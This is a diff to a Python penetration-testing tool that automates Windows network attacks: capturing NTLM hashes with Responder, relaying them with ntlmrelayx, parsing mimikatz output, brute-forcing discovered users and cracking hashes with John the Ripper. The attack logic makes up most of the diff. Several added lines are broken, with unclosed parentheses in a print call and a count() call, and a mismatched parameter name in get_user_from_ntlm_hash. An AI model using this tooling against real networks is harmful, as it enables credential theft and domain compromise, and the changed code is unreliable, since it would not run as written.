@@ -601,35 +601,6 @@ def run_proc(cmd):
     proc = Popen(cmd_split, stdout=f, stderr=STDOUT)
     return proc
 
-def get_resp_hashes(prev_creds):
-    '''
-    Checks the responder log folder for hashes found
-    '''
-    hashes = {}
-    logdir_path = os.getcwd()+'/submodules/Responder/logs'
-    resp_log_files = os.listdir(logdir_path)
-
-    for f in resp_log_files:
-        if '-NTLM' in f:
-            hash_path = logdir_path+'/'+f
-            ntlm_hash = open(hash_path, 'r').read()
-            if hash_path not in prev_creds:
-                # Do hash_path instead of actual hash to prevent dupes
-                prev_creds.append(hash_path)
-                print('[!] Hash found! '+ f)
-                if 'NTLMv1' in f:
-                    if 'NTLMv1' in hashes:
-                        hashes['NTLMv1'] += [ntlm_hash]
-                    else:
-                        hashes['NTLMv1'] = [ntlm_hash]
-                elif 'NTLMv2' in f:
-                    if 'NTLMv2' in hashes:
-                        hashes['NTLMv2'] += [ntlm_hash]
-                    else:
-                        hashes['NTLMv2'] = [ntlm_hash]
-
-    return prev_creds, hashes
-
 def create_john_cmd(hash_format, hash_file):
     '''
     Create JohnTheRipper command
@@ -647,24 +618,29 @@ def create_john_cmd(hash_format, hash_file):
     john_cmd = ' '.join(cmd)
     return john_cmd
 
-def crack_hashes(hashes, identifier):
+def crack_hashes(hashes):
     '''
     Crack hashes with john
     The hashes in the func args include usernames, domains, and such
+    hashes = {'NTLMv1':[hash1,hash2], 'NTLMv2':[hash1,hash2]}
     '''
     procs = []
+    identifier = ''.join(random.choice(string.ascii_letters) for x in range(7))
+
+    hash_folder = os.getcwd()+'/hashes'
+    if not os.path.isdir(hash_folder):
+        os.mkdir(hash_folder)
 
     if len(hashes) > 0:
-        # hashes = {'NTLMv1':['user:DOM:host:hash'], 'NTLMv2':['user:DOM:host:hash']}
         for hash_type in hashes:
-            filename = '{}-hashes-{}.txt'.format(hash_type, identifier)
+            filepath = hash_folder+'/{}-hashes-{}.txt'.format(hash_type, identifier)
             for h in hashes[hash_type]:
-                write_to_file(filename, h, 'a+')
+                write_to_file(filepath, h, 'a+')
             if 'v1' in hash_type:
                 hash_format = 'netntlm'
             elif 'v2' in hash_type:
                 hash_format = 'netntlmv2'
-            john_cmd = create_john_cmd(hash_format, filename)
+            john_cmd = create_john_cmd(hash_format, filepath)
             try:
                 john_proc = run_proc(john_cmd)
             except FileNotFoundError:
@@ -699,7 +675,7 @@ def get_cracked_pwds(prev_creds):
     '''
     Check for new cracked passwords
     '''
-    dir_contents = os.listdir(os.getcwd())
+    dir_contents = os.listdir(os.getcwd()+'/hashes')
 
     for x in dir_contents:
         if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
@@ -829,7 +805,7 @@ def parse_mimikatz(prev_creds, mimi_data, line):
 
     return prev_creds, mimi_data
 
-def print_responder_out(prev_lines):
+def parse_responder_log(args, prev_lines, prev_creds):
     '''
     Gets and cracks responder hashes
     Avoids getting and cracking previous hashes
@@ -841,45 +817,43 @@ def print_responder_out(prev_lines):
     if os.path.isfile(path):
         with open(path, 'r') as f:
             contents = f.readlines()
+
             for line in contents:
                 if line not in prev_lines:
                     new_lines.append(line)
                     line = line.strip()
                     print('    [Responder] '+line)
+                    prev_creds, new_hash = get_responder_hashes(line, prev_creds)
 
-    return new_lines
+                    if new_hash:
+                        if 'crack' not in args.skip.lower():
+                            john_proc = crack_hashes(new_hash)
+                            prev_creds = get_cracked_pwds(prev_creds)
 
-def parse_responder_line(line, ip, passwords, loop, prev_creds, prev_users):
+    return prev_creds, new_lines
+
+def get_responder_hashes(line, prev_creds):
     '''
     Parse responder to get usernames and IPs for 2 pw bruteforcing
     '''
-    client_id = ' Client   : '
-    user_id = ' Username : '
+    hash_id = ' Hash     : '
+    new_hash = None
 
-    if ip:
+    # We add the username in form of 'LAB\user' to prev_creds to prevent duplication
+    if hash_id in line:
+        ntlm_hash = line.split(hash_id)[-1].strip()+'\n'
+        hash_split = ntlm_hash.split(':')
+        user = hash_split[2]+'\\'+hash_split[0]
 
-        if user_id in line:
-            # user = 'DOM\username'
-            user = line.split(user_id)[-1].strip()
+        if user not in prev_creds:
+            prev_creds.append(user)
+            print('[+] Hash found! {}'.format(ntlm_hash)
+            if ntlm_hash.count(':') == 5:
+                new_hash = {'NTLMv2':[ntlm_hash]}
+            elif ntlm_hash.count(':' == 4:
+                new_hash = {'NTLMv1':[ntlm_hash]}
 
-            if user not in prev_users: 
-                prev_users.append(user)
-                print('[+] User found: ' + user)
-                ip_user = {ip:[user]}
-
-                cmd = create_brute_cmds(ip_user, passwords)
-                brute_output = async_get_outputs(loop, cmd)
-                prev_creds = parse_brute_output(brute_output, prev_creds)
-
-            ip = None
-
-        else:
-            print('[-] Error parsing Responder-Session.log: IP found in previous line yet this line is not " Username : xxx"')
-
-    if client_id in line:
-        ip = line.split(client_id)[-1].strip()
-
-    return prev_creds, prev_users, ip
+    return prev_creds, new_hash
 
 def cleanup_responder(resp_proc, prev_creds):
     '''
@@ -890,13 +864,24 @@ def cleanup_responder(resp_proc, prev_creds):
     timestamp = str(time.time())
     os.rename(path, path+'-'+timestamp)
     prev_creds = get_cracked_pwds(prev_creds)
+
     return prev_creds
 
-def parse_ntlmrelay_line(identifier, line, successful_auth, prev_creds, args):
+def get_user_from_ntlm_hash(ntlmhash):
+    '''
+    Gets the username in form of 'LAB\user' from ntlm hash
+    '''
+    hash_split = ntlm_hash.split(':')
+    user = hash_split[2]+'\\'+hash_split[0]
+
+    return user
+
+def parse_ntlmrelay_line(line, successful_auth, prev_creds, args):
     '''
     Parses ntlmrelayx.py's output
     '''
     hashes = {}
+
     # check for errors
     if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
         # First few lines of mimikatz logo start with '   ' and have #### in them
@@ -911,22 +896,22 @@ def parse_ntlmrelay_line(identifier, line, successful_auth, prev_creds, args):
     if successful_auth == True:
         successful_auth = False
         netntlm_hash = line.split()[-1]+'\n'
+        user = get_user_from_ntlm_hash(netntlm_hash)
 
-        if netntlm_hash.count(':') == 5:
-            hash_type = 'NTLMv2'
-            if netntlm_hash not in prev_creds:
-                prev_creds.append(netntlm_hash)
-                hashes['NTLMv2'] = [netntlm_hash]
+        if user not in prev_creds:
+            prev_creds.append(user)
 
-        if netntlm_hash.count(':') == 4:
-            hash_type = 'NTLMv1'
-            if netntlm_hash not in prev_creds:
-                prev_creds.append(netntlm_hash)
-                hashes['NTLMv1'] = [netntlm_hash]
+            if netntlm_hash.count(':') == 5:
+                hash_type = 'NTLMv2'
+                hashes[hash_type] = [netntlm_hash]
+
+            if netntlm_hash.count(':') == 4:
+                hash_type = 'NTLMv1'
+                hashes[hash_type] = [netntlm_hash]
 
         if len(hashes) > 0:
             if 'crack' not in args.skip.lower():
-                john_procs = crack_hashes(hashes, identifier)
+                john_procs = crack_hashes(hashes)
 
     if successful_auth == False:
         if ' SUCCEED' in line:
@@ -943,7 +928,7 @@ def parse_ntlmrelay_line(identifier, line, successful_auth, prev_creds, args):
 
     return prev_creds, successful_auth
 
-def do_ntlmrelay(identifier, prev_creds, args):
+def do_ntlmrelay(prev_creds, args):
     '''
     Continuously monitor and parse ntlmrelay output
     '''
@@ -979,7 +964,7 @@ def do_ntlmrelay(identifier, prev_creds, args):
     successful_auth = False
     for line in file_lines:
         # Parse ntlmrelay output
-        prev_creds, successful_auth = parse_ntlmrelay_line(identifier, line, successful_auth, prev_creds, args)
+        prev_creds, successful_auth = parse_ntlmrelay_line(line, successful_auth, prev_creds, args)
         # Parse mimikatz output
         prev_creds, mimi_data = parse_mimikatz(prev_creds, mimi_data, line)
 
@@ -1063,7 +1048,6 @@ def main(report, args):
     '''
     prev_creds = []
     prev_users = []
-    identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
     loop = asyncio.get_event_loop()
 
     passwords = create_passwords(args)
@@ -1104,20 +1088,8 @@ def main(report, args):
         timeout = time.time() + 60 * int(args.respondertime)
         try:
             while time.time() < timeout:
-                if 'crack' not in args.skip.lower():
-                    prev_creds, new_hashes = get_resp_hashes(prev_creds)
-                    john_proc = crack_hashes(new_hashes, identifier)
-                    prev_creds = get_cracked_pwds(prev_creds)
-
-                # Prints output and bruteforces Responder-found users
-                new_lines = print_responder_out(prev_lines)
-                ip = None
-                for line in new_lines:
-                    prev_lines.append(line)
-                    prev_creds, prev_users, ip = parse_responder_line(line, ip, passwords, loop, prev_creds, prev_users)
-
-                time.sleep(0.5)
-
+                prev_creds, new_lines = parse_responder_log(args, prev_lines, prev_creds)
+                time.sleep(0.1)
             prev_creds = cleanup_responder(resp_proc, prev_creds)
 
         except KeyboardInterrupt:
@@ -1128,7 +1100,7 @@ def main(report, args):
 
     # ATTACK 4: NTLM relay
     if 'relay' not in args.skip.lower() and len(hosts) > 0:
-        do_ntlmrelay(identifier, prev_creds, args)
+        do_ntlmrelay(prev_creds, args)
 
 if __name__ == "__main__":
     args = parse_args()
